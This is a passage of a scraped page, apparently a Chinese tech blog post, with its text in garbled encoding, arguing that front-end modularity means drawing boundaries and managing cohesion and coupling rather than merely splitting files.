                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><blockquote>
<p><strong>å†™åœ¨å‰é¢</strong></p>
<p>å¾ˆå¤šå‰ç«¯å¼€å‘è€…å¯¹â€œæ¨¡å—åŒ–â€çš„ç†è§£ï¼Œé•¿æœŸåœç•™åœ¨â€œæ–‡ä»¶æ‹†åˆ†â€çš„ç‰©ç†å±‚é¢ã€‚</p>
<p>æ¯”å¦‚ï¼šä¸€ä¸ª Vue/React ç»„ä»¶å†™äº† 1000 è¡Œï¼Œè§‰å¾—å¤ªä¹±äº†ï¼Œäºæ˜¯æŠŠé‡Œé¢çš„ä¸‰ä¸ªå‡½æ•°æå–å‡ºæ¥ï¼Œæ‰”åˆ° <code>utils.js</code> é‡Œï¼›æŠŠ HTML é‡Œçš„å¼¹çª—æ‹†å‡ºæ¥ï¼Œæ‰”åˆ° <code>components/Modal.vue</code> é‡Œã€‚åšå®Œè¿™äº›ï¼Œçœ‹ç€åªæœ‰ 200 è¡Œçš„ä¸»æ–‡ä»¶ï¼Œå¿ƒé‡Œä¸€é˜µèˆ’çˆ½ï¼šâ€œå•Šï¼Œæˆ‘åšå¥½äº†æ¨¡å—åŒ–ã€‚â€</p>
<p><strong>è¿™æ˜¯é”™è§‰ã€‚</strong></p>
<p>å¦‚æœä½ åªæ˜¯æŠŠä¸€å›¢ä¹±éº»çš„ä»£ç åˆ‡æˆäº†äº”æ®µä¹±éº»ï¼Œé‚£è¿™ä¸å«æ¨¡å—åŒ–ï¼Œè¿™å« <strong>â€œåˆ†å¸ƒå¼å±å±±â€</strong> ã€‚</p>
<p>åœ¨æ¶æ„å¸ˆçš„çœ¼é‡Œï¼Œæ¨¡å—åŒ–ä¸æ˜¯ä¸ºäº†æŠŠæ–‡ä»¶å˜å°ï¼Œè€Œæ˜¯ä¸ºäº†<strong>æ²»ç†å¤æ‚æ€§</strong>ã€‚å®ƒæ˜¯å…³äº<strong>è¾¹ç•Œï¼ˆBoundariesï¼‰</strong> ã€<strong>å†…èšï¼ˆCohesionï¼‰</strong> å’Œ <strong>è€¦åˆï¼ˆCouplingï¼‰</strong> çš„è‰ºæœ¯ã€‚æœ¬ç¯‡æˆ‘ä»¬å°†æŠ›å¼€å…·ä½“çš„è¯­æ³•ï¼Œæ¢è®¨å¦‚ä½•å»ºç«‹æ¶æ„çº§åˆ«çš„æ¨¡å—åŒ–æ€ç»´ã€‚</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f78d964b574e4d9bba60d915a937165b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv546L5aOu5aOu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769601027&amp;x-signature=uOlTWK4ZDG84tfzE7MWdoeUM4eY%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€ ä»€ä¹ˆæ˜¯æ¨¡å—ï¼Ÿä»â€œç‰©ç†æ–‡ä»¶â€åˆ°â€œé€»è¾‘å•å…ƒâ€</h2>
<p>åˆçº§å·¥ç¨‹å¸ˆçœ‹æ¨¡å—ï¼Œçœ‹åˆ°çš„æ˜¯æ–‡ä»¶åç¼€ï¼ˆ<code>.js</code>, <code>.vue</code>, <code>.tsx</code>ï¼‰ï¼›æ¶æ„å¸ˆçœ‹æ¨¡å—ï¼Œçœ‹åˆ°çš„æ˜¯<strong>èŒè´£çš„è¾¹ç•Œ</strong>ã€‚</p>
<h3 data-id="heading-1">1.1 æ¨¡å—åŒ–çš„ä¸‰ä¸ªå±‚çº§</h3>
<p>æˆ‘ä»¬çš„è®¤çŸ¥é€šå¸¸ç»å†äº†ä¸‰ä¸ªé˜¶æ®µçš„è¿›åŒ–ï¼š</p>
<ol>
<li><strong>è¯­æ³•çº§æ¨¡å—åŒ– (Syntax Level)ï¼š</strong> è¿™æ˜¯æœ€åŸºç¡€çš„ã€‚AMDã€CommonJSã€ES Modulesã€‚è§£å†³çš„æ˜¯<strong>å‘½åç©ºé—´æ±¡æŸ“</strong>å’Œ<strong>è„šæœ¬åŠ è½½é¡ºåº</strong>çš„é—®é¢˜ã€‚è¿™æ˜¯ 2015 å¹´å‰æˆ‘ä»¬è¦è§£å†³çš„ä¸»è¦çŸ›ç›¾ï¼Œç°åœ¨å·²ç»å˜æˆäº†åƒç©ºæ°”ä¸€æ ·çš„åŸºç¡€è®¾æ–½ã€‚</li>
<li><strong>æ–‡ä»¶çº§æ¨¡å—åŒ– (File Level)ï¼š</strong> ä¸ºäº†ä»£ç å¤ç”¨ï¼Œæˆ‘ä»¬å°†é€šç”¨é€»è¾‘æå–ä¸º <code>hooks</code>ï¼Œå°† UI æå–ä¸º <code>components</code>ã€‚è¿™æ˜¯ç›®å‰ç»å¤§å¤šæ•°ä¸­çº§å·¥ç¨‹å¸ˆæ‰€å¤„çš„é˜¶æ®µã€‚ä½†å¦‚æœä¸å°å¿ƒï¼Œå¾ˆå®¹æ˜“é™·å…¥ <strong>â€œä¸ºäº†æ‹†åˆ†è€Œæ‹†åˆ†â€</strong> çš„é™·é˜±ã€‚</li>
<li><strong>é¢†åŸŸçº§æ¨¡å—åŒ– (Domain Level)ï¼š</strong> è¿™æ˜¯æ¶æ„å¸ˆå…³æ³¨çš„å±‚é¢ã€‚ä¸€ä¸ªæ¨¡å—ä¸å†æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œè€Œæ˜¯ä¸€ä¸ª<strong>ä¸šåŠ¡èƒ½åŠ›çš„é›†åˆ</strong>ã€‚ æ¯”å¦‚â€œç”¨æˆ·æ¨¡å—â€ï¼Œå®ƒå¯èƒ½åŒ…å« <code>UserCard.tsx</code>ï¼ˆUIï¼‰ã€<code>useUser.ts</code>ï¼ˆé€»è¾‘ï¼‰ã€<code>user-service.ts</code>ï¼ˆAPIï¼‰ã€<code>UserType.ts</code>ï¼ˆç±»å‹ï¼‰ã€‚å®ƒä»¬åœ¨ç‰©ç†ä¸Šå¯èƒ½åˆ†æ•£ï¼Œä½†åœ¨é€»è¾‘ä¸Šæ˜¯ä¸€ä¸ªæ•´ä½“ã€‚<strong>åªæœ‰å½“è¿™ä¸ªæ•´ä½“å¯¹å¤–æš´éœ²æå…¶æœ‰é™çš„æ¥å£ï¼Œè€Œéšè—å†…éƒ¨æ‰€æœ‰å¤æ‚åº¦æ—¶ï¼Œå®ƒæ‰æ˜¯ä¸€ä¸ªçœŸæ­£çš„æ¨¡å—ã€‚</strong></li>
</ol>
<h3 data-id="heading-2">1.2 æ¶æ„å¸ˆçš„è§†è§’ï¼šéšè—è€Œéæš´éœ²</h3>
<p>è½¯ä»¶å·¥ç¨‹å¤§å¸ˆ David Parnas æ—©åœ¨ 1972 å¹´å°±æå‡ºäº†ä¸€ä¸ªæŒ¯è‹å‘è©çš„è§‚ç‚¹ï¼š</p>
<blockquote>
<p><strong>â€œæ¨¡å—åŒ–çš„æ ¸å¿ƒåœ¨äºä½ éšè—äº†ä»€ä¹ˆï¼Œè€Œä¸æ˜¯ä½ æš´éœ²äº†ä»€ä¹ˆã€‚â€</strong></p>
</blockquote>
<p>åœ¨å‰ç«¯å¼€å‘ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸çŠ¯çš„é”™è¯¯æ˜¯<strong>æš´éœ²è¿‡å¤š</strong>ã€‚</p>
<ul>
<li><strong>é”™è¯¯ç¤ºèŒƒï¼š</strong> ä¸€ä¸ª <code>DatePicker</code> ç»„ä»¶ï¼Œé€šè¿‡ <code>props</code> æŠŠå†…éƒ¨çš„ <code>calendarInstance</code> æš´éœ²ç»™çˆ¶ç»„ä»¶ï¼Œå…è®¸çˆ¶ç»„ä»¶ç›´æ¥æ“ä½œæ—¥å†å†…éƒ¨çŠ¶æ€ã€‚</li>
<li><strong>æ¶æ„ç¾éš¾ï¼š</strong> è¿™æ„å‘³ç€çˆ¶ç»„ä»¶å’Œå­ç»„ä»¶å½¢æˆäº†<strong>éšæ€§è€¦åˆ</strong>ã€‚ä¸€æ—¦å“ªå¤©ä½ è¦æŠŠåº•å±‚çš„æ—¥å†åº“ä» Moment.js æ¢æˆ Day.jsï¼Œæ•´ä¸ªåº”ç”¨å¯èƒ½éƒ½ä¼šå´©æºƒã€‚</li>
</ul>
<p><strong>çœŸæ­£çš„æ¨¡å—åŒ–æ€ç»´æ˜¯â€œé»‘ç›’æ€ç»´â€ï¼š</strong> å¤–éƒ¨åªç®¡è¾“å…¥ï¼ˆProps/Paramsï¼‰å’Œè¾“å‡ºï¼ˆEvents/Return Valuesï¼‰ï¼Œç»ä¸å…³å¿ƒå†…éƒ¨æ˜¯å¦‚ä½•å®ç°çš„ã€‚</p>
<hr/>
<h2 data-id="heading-3">äºŒã€ æ ¸å¿ƒå¿ƒæ³•ï¼šé«˜å†…èšä¸ä½è€¦åˆçš„è¾©è¯å…³ç³»</h2>
<p>è¿™å…«ä¸ªå­—è¢«è¯´çƒ‚äº†ï¼Œä½†çœŸæ­£èƒ½åšåˆ°çš„å¯¥å¯¥æ— å‡ ã€‚åœ¨å‰ç«¯è¯­å¢ƒä¸‹ï¼Œå®ƒä»¬æœ‰å…·ä½“çš„è½åœ°å«ä¹‰ã€‚</p>
<h3 data-id="heading-4">2.1 ä»€ä¹ˆæ˜¯â€œçœŸå†…èšâ€ï¼Ÿ(True Cohesion)</h3>
<p>å¾ˆå¤šé¡¹ç›®ä¹ æƒ¯æŒ‰â€œæŠ€æœ¯ç±»å‹â€åˆ†ç›®å½•ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-attribute">src</span>/
  â”œâ”€â”€ components/  (æ”¾æ‰€æœ‰ç»„ä»¶)
  â”œâ”€â”€ hooks/       (æ”¾æ‰€æœ‰é’©å­)
  â”œâ”€â”€ utils/       (æ”¾æ‰€æœ‰å·¥å…·)
  â”œâ”€â”€ types/       (æ”¾æ‰€æœ‰ç±»å‹)
</code></pre>
<p>è¿™çœ‹èµ·æ¥å¾ˆæ•´æ´ï¼Œå…¶å®æ˜¯ <strong>â€œå‡å†…èšâ€</strong> ï¼ˆæˆ–è€…å«å¶ç„¶å†…èšï¼‰ã€‚ å½“ä½ éœ€è¦ä¿®æ”¹â€œç™»å½•â€åŠŸèƒ½æ—¶ï¼Œä½ éœ€è¦å» <code>components</code> æ”¹è¡¨å•ï¼Œå» <code>hooks</code> æ”¹é€»è¾‘ï¼Œå» <code>types</code> æ”¹æ¥å£å®šä¹‰ã€‚ä½ çš„ä¿®æ”¹è¡Œä¸ºæ˜¯<strong>è·¨è¶Šç©ºé—´</strong>çš„ã€‚</p>
<p><strong>ç°ä»£å‰ç«¯æ¶æ„æ¨å´‡çš„â€œçœŸå†…èšâ€æ˜¯æŒ‰â€œåŠŸèƒ½ç‰¹æ€§ï¼ˆFeatureï¼‰â€ç»„ç»‡ï¼š</strong></p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-attribute">src</span>/
  â”œâ”€â”€ features/
  â”‚   â”œâ”€â”€ auth/          (ç™»å½•æ¨¡å—ï¼šåŒ…å«è‡ªå·±çš„ components, hooks, types)
  â”‚   â”œâ”€â”€ dashboard/     (å¤§ç›˜æ¨¡å—)
</code></pre>
<p><strong>åˆ¤å®šæ ‡å‡†ï¼š</strong> é‚£äº›<strong>åªæœ‰åœ¨ä¸€èµ·å·¥ä½œæ‰æœ‰æ„ä¹‰</strong>çš„ä»£ç ï¼Œå¿…é¡»ç‰©ç†ä¸Šå°±åœ¨ä¸€èµ·ã€‚<strong>å…±åŒå°é—­åŸåˆ™ï¼ˆCCPï¼‰</strong> å‘Šè¯‰æˆ‘ä»¬ï¼š<strong>å°†é‚£äº›ä¼šå› ä¸ºç›¸åŒç†ç”±è€Œä¿®æ”¹çš„ç±»/æ–‡ä»¶ï¼Œèšåˆåœ¨ä¸€èµ·ã€‚</strong></p>
<h3 data-id="heading-5">2.2 ä»€ä¹ˆæ˜¯â€œä½è€¦åˆâ€ï¼Ÿ(Loose Coupling)</h3>
<p>è€¦åˆä¸å¯é¿å…ï¼Œæ²¡æœ‰è€¦åˆçš„ä»£ç å°±æ˜¯ä¸€å †æ­»ä»£ç ã€‚æ¶æ„å¸ˆè¦åšçš„æ˜¯<strong>æ²»ç†è€¦åˆçš„ç±»å‹</strong>ã€‚</p>
<ul>
<li><strong>å†…å®¹è€¦åˆï¼ˆæœ€å·®ï¼‰ï¼š</strong> ç›´æ¥ä¿®æ”¹å¦ä¸€ä¸ªæ¨¡å—çš„å†…éƒ¨æ•°æ®ã€‚æ¯”å¦‚ç»„ä»¶ A é€šè¿‡ <code>ref</code> å¼ºè¡Œä¿®æ”¹ç»„ä»¶ B çš„ stateã€‚</li>
<li><strong>æ§åˆ¶è€¦åˆï¼ˆè¾ƒå·®ï¼‰ï¼š</strong> ä¼ é€’ flag å‘Šè¯‰å¦ä¸€ä¸ªæ¨¡å—è¯¥æ€ä¹ˆåšã€‚æ¯”å¦‚ <code>Button</code> ç»„ä»¶æ¥æ”¶ä¸€ä¸ª <code>isLoginButton</code> çš„ propï¼Œå¯¼è‡´ Button å†…éƒ¨åŒ…å«äº†ä¸šåŠ¡é€»è¾‘ã€‚</li>
<li><strong>æ•°æ®è€¦åˆï¼ˆæ¨èï¼‰ï¼š</strong> ä»…ä»…ä¼ é€’æ•°æ®ã€‚ç»„ä»¶åªæ¥æ”¶å®ƒéœ€è¦æ¸²æŸ“çš„æ•°æ®ï¼Œä¸å…³å¿ƒæ•°æ®æ¥æºã€‚</li>
<li><strong>äº‹ä»¶/æ¶ˆæ¯è€¦åˆï¼ˆæœ€ä¼˜ï¼‰ï¼š</strong> é€šè¿‡å‘å¸ƒè®¢é˜…æˆ–å›è°ƒå‡½æ•°é€šä¿¡ã€‚æˆ‘ä¸ç›´æ¥è°ƒç”¨ä½ ï¼Œæˆ‘åªå¹¿æ’­â€œæˆ‘åšå®Œäº†â€ï¼Œè°å…³å¿ƒè°å°±æ¥å¤„ç†ã€‚</li>
</ul>
<p><strong>æ¶æ„å¸ˆçš„åˆ€æ³•ï¼š</strong> å½“ä½ å‘ç°ä¸¤ä¸ªæ¨¡å—å¿…é¡»åŒæ—¶ä¿®æ”¹æ‰èƒ½è·‘é€šæ—¶ï¼Œå®ƒä»¬å°±æ˜¯<strong>å¼ºè€¦åˆ</strong>çš„ã€‚è¦ä¹ˆæŠŠå®ƒä»¬åˆå¹¶æˆä¸€ä¸ªæ¨¡å—ï¼Œè¦ä¹ˆå¼•å…¥ä¸€ä¸ªä¸­é—´å±‚ï¼ˆé€‚é…å™¨ï¼‰æ¥è§£è€¦ã€‚</p>
<hr/>
<h2 data-id="heading-6">ä¸‰ã€ è¾¹ç•Œæ€ç»´ï¼šå¦‚ä½•åˆ‡åˆ†æ¨¡å—ï¼Ÿ</h2>
<p>åœ¨æ‹¿åˆ°ä¸€ä¸ªå¤æ‚çš„ä¸šåŠ¡éœ€æ±‚ï¼ˆæ¯”å¦‚ä¸€ä¸ªåœ¨çº¿åä½œæ–‡æ¡£ç¼–è¾‘å™¨ï¼‰æ—¶ï¼Œæ™®é€šå¼€å‘è€…çš„ç¬¬ä¸€ååº”æ˜¯ç”»é¡µé¢ï¼Œè€Œæ¶æ„å¸ˆçš„ç¬¬ä¸€ååº”æ˜¯<strong>åˆ’è¾¹ç•Œ</strong>ã€‚</p>
<h3 data-id="heading-7">3.1 ä¸ç¨³å®šçš„ä¾èµ–è¦éš”ç¦»</h3>
<p><strong>ç¨³å®šä¾èµ–åŸåˆ™ï¼ˆSDPï¼‰ï¼š</strong> ä¾èµ–å…³ç³»åº”è¯¥æŒ‡å‘æ›´ç¨³å®šçš„æ–¹å‘ã€‚</p>
<ul>
